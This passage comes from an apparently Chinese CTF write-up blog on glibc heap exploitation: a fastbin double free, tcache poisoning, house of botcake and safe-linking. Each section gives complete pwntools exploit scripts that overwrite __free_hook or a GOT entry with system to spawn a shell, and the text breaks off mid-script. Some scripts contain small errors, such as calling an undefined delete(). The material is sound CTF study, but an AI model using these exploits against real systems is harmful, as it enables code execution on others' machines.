class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#--------------- 1. leak_libc  ----------------------------</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>libc_base = main_arena - libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#-------------- 2. double_free ------------------------------- </span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#-------------- 3. Arbitrary Alloc ------------------------------- </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">pwndbg&gt; x /20xg 0x602002-8</span><br><span class="hljs-string">0x601ffa:0x1e280000000000000xa168000000000060</span><br><span class="hljs-string">0x60200a:0x00000000000453a00xd54000007f8f11c5</span><br><span class="hljs-string">0x60201a &lt;free@got.plt+2&gt;:0xa2a000007f8f118f0x86a000007f8f118e</span><br><span class="hljs-string">0x60202a &lt;puts@got.plt+2&gt;:0x073600007f8f118e0xf6c0000000000040</span><br><span class="hljs-string">0x60203a &lt;setbuf@got.plt+2&gt;:0xe81000007f8f118e0x035000007f8f118c</span><br><span class="hljs-string">0x60204a &lt;read@got.plt+2&gt;:0x975000007f8f11970xd18000007f8f1189</span><br><span class="hljs-string">0x60205a &lt;malloc@got.plt+2&gt;:0x44e000007f8f118f0x07a600007f8f118e</span><br><span class="hljs-string">0x60206a &lt;exit@got.plt+2&gt;:0x00000000000000400x0000000000000000</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>fake_chunk = <span class="hljs-number">0x602002</span>-<span class="hljs-number">8</span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x50</span>,p64(fake_chunk)) <br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">14</span> + p64(system))<br>free(<span class="hljs-number">3</span>)<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="6-editable-note"><a href="#6-editable-note" class="headerlink" title="6.editable_note"></a>6.editable_note</h2><p><strong>glibc-2.31</strong></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>第一种方法：Tcache poinsioning:存在UAF和edit功能，能直接修改bin链上chunk的fd指针，将free_hook改为system</p><p>另一种方法：house of botcake解（下一题使用）</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><strong>exp</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------------ MENU  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">4</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#------------------------ 1.leak libc  ----------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>add(i, <span class="hljs-number">0x80</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>delete(i)<br><br>show(<span class="hljs-number">7</span>)<br> <br>libc_base=u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)-<span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#------------------------ 2.tcache poinsioning  ----------------</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>edit(<span class="hljs-number">10</span>,p64(system_addr))<br><br>free(<span class="hljs-number">9</span>)<br><br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="7-new-fast-note"><a href="#7-new-fast-note" class="headerlink" title="7.new_fast_note"></a>7.new_fast_note</h2><p><strong>glibc-2.31</strong></p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a><strong>house of botcake</strong></h3><p>大致思路就是先填满tcache bin（7个）后将chunk分配到unsorted bin中泄露main_arena，然后将tcache分配到__free_hook上覆盖更改为system</p><p>在更改tcache中chunk的next位时，一定要确保分配完__free_hook上的chunk后，tcache-&gt;counts要大于1</p><p>原因是每一个不同大小的tcache，它都独立维护一个counts域，而在malloc的时候会检查这个域，只有当它大于等于0的时候才会执行tcache_get</p><p><strong>目的是将chunk同时放进tcache bin和unsorted，可以绕过tcache bin在libc2.32后存在key的问题，同时带有libc地址</strong></p><p><strong>how2heap: POC</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br><br>    <span class="hljs-comment">//申请七个，用于填tcache bin</span><br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-comment">//再申请三个,chunk1-3，第三个用于分隔top chunk</span><br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-comment">//释放填充tcache bin</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br>    <span class="hljs-comment">//先释放chunk2，再释放chunk1</span><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <span class="hljs-comment">//申请出chunk2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//再将chunk2挂入，此时其同时存在于unsorted bin和tcache bin上</span><br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再通过申请chunk，切割unsorted bin，堆重叠到tcache bin，改写为free_hook地址</p><p>申请两次，再改写为system</p><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>模板跟上一题有改变</p><p><strong>add：index，size，content</strong></p><p><strong>delete：index</strong></p><p><strong>show：index</strong></p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><ol><li>通过house of botcake泄露libc和heap地址</li><li>申请堆块，堆重叠，覆写tcache bin[0]的fd指针</li><li>tchache poinsioning打free_hook为system</li></ol><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a><strong>exp</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------------ MENU  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#------------------------ 1. house of botcake ----------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(i, <span class="hljs-number">0x80</span>)<br><br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>free(i)<br><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment">#unsorted</span><br>free(<span class="hljs-number">7</span>)<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>) <span class="hljs-comment">#</span><br>heap_base=u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)-<span class="hljs-number">0x570</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br>show(<span class="hljs-number">7</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)-<span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#------------- 2.overlapping + tcache poinsioning ----------</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x91</span>) + p64(free_hook) )<br><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x80</span>, p64(system))<br><br>free(<span class="hljs-number">12</span>)<br><span class="hljs-comment">#debug()</span><br>pi()<br></code></pre></td></tr></table></figure><h2 id="8-safe-note"><a href="#8-safe-note" class="headerlink" title="8.safe_note"></a>8.safe_note</h2><h3 id="safe-linking"><a href="#safe-linking" class="headerlink" title="safe_linking"></a>safe_linking</h3><p><strong>Glibc 2.32</strong></p><p><strong>新增safe linking机制</strong>：将<strong>fd指针的地址</strong>右移12位再和<strong>fd指针本身</strong>异或,如下,L为指针的地址,P为指针本身,该操作是可逆的,取指针时再做一次操作就可以还原得到原来的指针 <strong>(safe &#x3D; fd&gt;&gt;12 ^ fd)</strong></p><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>菜单题，增删改查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+14h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>    <span class="hljs-keyword">switch</span> ( v4 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        add_note();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        delete_note();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        edit_note();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        show_note();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong choice!&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>add_note：次数16，大小小于0xFF</strong></p><p><strong>delete_note：UAF</strong></p><p><strong>edit_note：直接修改内容</strong></p><p><strong>show_note：输出</strong></p><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ol><li><strong>填满tcache bin，再造个unsorted bin</strong></li><li><strong>泄露tcache bin[0]得到的是key，key&lt;&lt;12为heap_base</strong></li><li><strong>切分unsorted bin，泄露libc</strong></li><li><strong>通过tcache poisioning，改链子，指向free_hook（此时写free_hook^key）</strong></li><li><strong>再malloc，修改free_hook为system，实现攻击</strong></li></ol><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 